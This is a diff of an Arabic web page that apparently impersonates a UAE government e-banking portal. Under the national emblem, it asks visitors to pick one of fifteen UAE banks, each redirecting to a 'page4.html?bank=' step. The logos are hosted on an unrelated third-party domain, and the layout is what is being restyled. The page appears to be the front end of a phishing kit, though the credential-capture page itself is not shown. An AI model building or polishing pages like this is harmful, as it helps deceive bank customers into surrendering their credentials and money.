@@ -16,9 +16,8 @@
         body {
             font-family: Arial, sans-serif;
             color: #333;
-            background: #1a3b70;
-            padding: 20px;
-            line-height: 1.8;
+            background: white;
+            padding: 0;
             margin: 0;
             max-width: 100%;
             box-sizing: border-box;
@@ -26,12 +25,14 @@
 
         /* Responsive adjustments */
         @media (max-width: 768px) {
-            body {
-                padding: 15px;
-                font-size: 14px;
+            .header-section {
+                padding: 20px 10px;
             }
-            .header img {
-                height: 50px;
+            .header-title {
+                font-size: 28px;
+            }
+            .header-subtitle {
+                font-size: 14px;
             }
             .bank-card {
                 padding: 15px;
@@ -40,12 +41,14 @@
         }
 
         @media (max-width: 480px) {
-            body {
-                padding: 10px;
-                font-size: 13px;
+            .header-section {
+                padding: 15px 5px;
             }
-            .header img {
-                height: 40px;
+            .header-title {
+                font-size: 24px;
+            }
+            .header-subtitle {
+                font-size: 12px;
             }
             .bank-card {
                 padding: 12px;
@@ -53,31 +56,40 @@
             }
         }
 
-        .header {
+        .header-section {
             text-align: center;
-            margin-bottom: 20px;
+            padding: 30px 20px;
+            background: white;
+            border-bottom: 3px solid #ffc107;
         }
-        .header img {
-            height: 70px;
-            vertical-align: middle;
-            margin-right: 10px;
+        .header-logo {
+            height: 100px;
+            margin: 0 auto 20px;
+            display: block;
         }
-        h1 {
-            text-align: center;
+        .header-title {
+            font-size: 40px;
             color: #1a3b70;
-            margin-top: 20px;
-            margin-bottom: 10px;
+            margin: 20px 0 10px;
+            font-weight: bold;
+            line-height: 1.2;
         }
-        .subtitle {
-            text-align: center;
+        .header-subtitle {
+            font-size: 18px;
             color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
+            margin: 10px 0 20px;
+        }
+        .main-content {
+            background: #1a3b70;
+            padding: 20px;
+            min-height: 100vh;
         }
         .bank-cards {
             display: flex;
             flex-direction: column;
             gap: 15px;
+            max-width: 600px;
+            margin: 0 auto;
         }
         .bank-card {
             background: white;
@@ -108,105 +120,106 @@
 </head>
 <body>
 
-<div class="header">
-    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663274230955/DMODLxGCgWXOSvqi.png" alt="شعار الإمارات العربية المتحدة">
+<div class="header-section">
+    <img src="https://files.manuscdn.com/user_upload_by_module/session_file/310519663274230955/DMODLxGCgWXOSvqi.png" alt="شعار الإمارات العربية المتحدة" class="header-logo">
+    <h1 class="header-title">الخدمات المصرفية الإلكترونية</h1>
+    <div class="header-subtitle">الرجاء اختيار البنك الخاص بك للمتابعة</div>
 </div>
 
-<h1>الخدمات المصرفية الإلكترونية</h1>
-<div class="subtitle">الرجاء اختيار البنك الخاص بك للمتابعة</div>
+<div class="main-content">
+    <div class="bank-cards">
 
-<div class="bank-cards">
+        <!-- مصرف أبوظبي الإسلامي -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=ADIB'">
+            <img src="https://alkhaleeg.services/sadUae/images/adib_logo.png" alt="مصرف أبوظبي الإسلامي" class="bank-logo">
+            <div class="bank-name">مصرف أبوظبي الإسلامي</div>
+        </div>
 
-    <!-- مصرف أبوظبي الإسلامي -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=ADIB'">
-        <img src="https://alkhaleeg.services/sadUae/images/adib_logo.png" alt="مصرف أبوظبي الإسلامي" class="bank-logo">
-        <div class="bank-name">مصرف أبوظبي الإسلامي</div>
+        <!-- مصرف عجمان -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=Ajman'">
+            <img src="https://alkhaleeg.services/sadUae/images/ajman_bank_logo.png" alt="مصرف عجمان" class="bank-logo">
+            <div class="bank-name">مصرف عجمان</div>
+        </div>
+
+        <!-- بنك دبي الإسلامي -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=DIB'">
+            <img src="https://alkhaleeg.services/sadUae/images/dubai_islamic_bank_logo.png" alt="بنك دبي الإسلامي" class="bank-logo">
+            <div class="bank-name">بنك دبي الإسلامي</div>
+        </div>
+
+        <!-- بنك المشرق -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=Mashreq'">
+            <img src="https://alkhaleeg.services/sadUae/images/mashreq_bank_logo.png" alt="بنك المشرق" class="bank-logo">
+            <div class="bank-name">بنك المشرق</div>
+        </div>
+
+        <!-- مصرف الشارقة الإسلامي -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=SharjahIslamic'">
+            <img src="https://alkhaleeg.services/sadUae/images/sharjah_islamic_bank_logo.png" alt="مصرف الشارقة الإسلامي" class="bank-logo">
+            <div class="bank-name">مصرف الشارقة الإسلامي</div>
+        </div>
+
+        <!-- بنك أبوظبي الأول -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=FAB'">
+            <img src="https://alkhaleeg.services/sadUae/images/fab_bank_logo.png" alt="بنك أبوظبي الأول" class="bank-logo">
+            <div class="bank-name">بنك أبوظبي الأول</div>
+        </div>
+
+        <!-- بنك HSBC -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=HSBC'">
+            <img src="https://alkhaleeg.services/sadUae/images/hsbc_bank_logo.png" alt="بنك HSBC" class="bank-logo">
+            <div class="bank-name">بنك HSBC</div>
+        </div>
+
+        <!-- بنك أبوظبي التجاري -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=ADCB'">
+            <img src="https://alkhaleeg.services/sadUae/images/adcb_bank_logo.png" alt="بنك أبوظبي التجاري" class="bank-logo">
+            <div class="bank-name">بنك أبوظبي التجاري</div>
+        </div>
+
+        <!-- بنك رأس الخيمة الوطني -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=RAKBANK'">
+            <img src="https://alkhaleeg.services/sadUae/images/rakbank_logo.png" alt="بنك رأس الخيمة الوطني" class="bank-logo">
+            <div class="bank-name">بنك رأس الخيمة الوطني</div>
+        </div>
+
+        <!-- البنك التجاري الدولي -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=CBI'">
+            <img src="https://alkhaleeg.services/sadUae/images/cbi_bank_logo.png" alt="البنك التجاري الدولي" class="bank-logo">
+            <div class="bank-name">البنك التجاري الدولي</div>
+        </div>
+
+        <!-- بنك الفجيرة الوطني -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=NBF'">
+            <img src="https://alkhaleeg.services/sadUae/images/nbf_bank_logo.png" alt="بنك الفجيرة الوطني" class="bank-logo">
+            <div class="bank-name">بنك الفجيرة الوطني</div>
+        </div>
+
+        <!-- الإمارات الإسلامي -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=EmiratesIslamic'">
+            <img src="https://alkhaleeg.services/sadUae/images/emirates_islamic_bank_logo.png" alt="الإمارات الإسلامي" class="bank-logo">
+            <div class="bank-name">الإمارات الإسلامي</div>
+        </div>
+
+        <!-- بنك الإمارات دبي الوطني -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=ENBD'">
+            <img src="https://alkhaleeg.services/sadUae/images/nbd_bank_logo.png" alt="بنك الإمارات دبي الوطني" class="bank-logo">
+            <div class="bank-name">بنك الإمارات دبي الوطني</div>
+        </div>
+
+        <!-- بنك دبي التجاري -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=CBD'">
+            <img src="https://alkhaleeg.services/sadUae/images/commercial_bank_of_dubai_logo.png" alt="بنك دبي التجاري" class="bank-logo">
+            <div class="bank-name">بنك دبي التجاري</div>
+        </div>
+
+        <!-- بنك LIV -->
+        <div class="bank-card" onclick="window.location.href='page4.html?bank=LIV'">
+            <img src="https://alkhaleeg.services/sadUae/images/liv_bank_logo.png" alt="بنك LIV" class="bank-logo">
+            <div class="bank-name">بنك LIV</div>
+        </div>
+
     </div>
-
-    <!-- مصرف عجمان -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=Ajman'">
-        <img src="https://alkhaleeg.services/sadUae/images/ajman_bank_logo.png" alt="مصرف عجمان" class="bank-logo">
-        <div class="bank-name">مصرف عجمان</div>
-    </div>
-
-    <!-- بنك دبي الإسلامي -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=DIB'">
-        <img src="https://alkhaleeg.services/sadUae/images/dubai_islamic_bank_logo.png" alt="بنك دبي الإسلامي" class="bank-logo">
-        <div class="bank-name">بنك دبي الإسلامي</div>
-    </div>
-
-    <!-- بنك المشرق -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=Mashreq'">
-        <img src="https://alkhaleeg.services/sadUae/images/mashreq_bank_logo.png" alt="بنك المشرق" class="bank-logo">
-        <div class="bank-name">بنك المشرق</div>
-    </div>
-
-    <!-- مصرف الشارقة الإسلامي -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=SharjahIslamic'">
-        <img src="https://alkhaleeg.services/sadUae/images/sharjah_islamic_bank_logo.png" alt="مصرف الشارقة الإسلامي" class="bank-logo">
-        <div class="bank-name">مصرف الشارقة الإسلامي</div>
-    </div>
-
-    <!-- بنك أبوظبي الأول -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=FAB'">
-        <img src="https://alkhaleeg.services/sadUae/images/fab_bank_logo.png" alt="بنك أبوظبي الأول" class="bank-logo">
-        <div class="bank-name">بنك أبوظبي الأول</div>
-    </div>
-
-    <!-- بنك HSBC -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=HSBC'">
-        <img src="https://alkhaleeg.services/sadUae/images/hsbc_bank_logo.png" alt="بنك HSBC" class="bank-logo">
-        <div class="bank-name">بنك HSBC</div>
-    </div>
-
-    <!-- بنك أبوظبي التجاري -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=ADCB'">
-        <img src="https://alkhaleeg.services/sadUae/images/adcb_bank_logo.png" alt="بنك أبوظبي التجاري" class="bank-logo">
-        <div class="bank-name">بنك أبوظبي التجاري</div>
-    </div>
-
-    <!-- بنك رأس الخيمة الوطني -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=RAKBANK'">
-        <img src="https://alkhaleeg.services/sadUae/images/rakbank_logo.png" alt="بنك رأس الخيمة الوطني" class="bank-logo">
-        <div class="bank-name">بنك رأس الخيمة الوطني</div>
-    </div>
-
-    <!-- البنك التجاري الدولي -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=CBI'">
-        <img src="https://alkhaleeg.services/sadUae/images/cbi_bank_logo.png" alt="البنك التجاري الدولي" class="bank-logo">
-        <div class="bank-name">البنك التجاري الدولي</div>
-    </div>
-
-    <!-- بنك الفجيرة الوطني -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=NBF'">
-        <img src="https://alkhaleeg.services/sadUae/images/nbf_bank_logo.png" alt="بنك الفجيرة الوطني" class="bank-logo">
-        <div class="bank-name">بنك الفجيرة الوطني</div>
-    </div>
-
-    <!-- الإمارات الإسلامي -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=EmiratesIslamic'">
-        <img src="https://alkhaleeg.services/sadUae/images/emirates_islamic_bank_logo.png" alt="الإمارات الإسلامي" class="bank-logo">
-        <div class="bank-name">الإمارات الإسلامي</div>
-    </div>
-
-    <!-- بنك الإمارات دبي الوطني -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=ENBD'">
-        <img src="https://alkhaleeg.services/sadUae/images/nbd_bank_logo.png" alt="بنك الإمارات دبي الوطني" class="bank-logo">
-        <div class="bank-name">بنك الإمارات دبي الوطني</div>
-    </div>
-
-    <!-- بنك دبي التجاري -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=CBD'">
-        <img src="https://alkhaleeg.services/sadUae/images/commercial_bank_of_dubai_logo.png" alt="بنك دبي التجاري" class="bank-logo">
-        <div class="bank-name">بنك دبي التجاري</div>
-    </div>
-
-    <!-- بنك LIV -->
-    <div class="bank-card" onclick="window.location.href='page4.html?bank=LIV'">
-        <img src="https://alkhaleeg.services/sadUae/images/liv_bank_logo.png" alt="بنك LIV" class="bank-logo">
-        <div class="bank-name">بنك LIV</div>
-    </div>
-
 </div>
 
 </body>
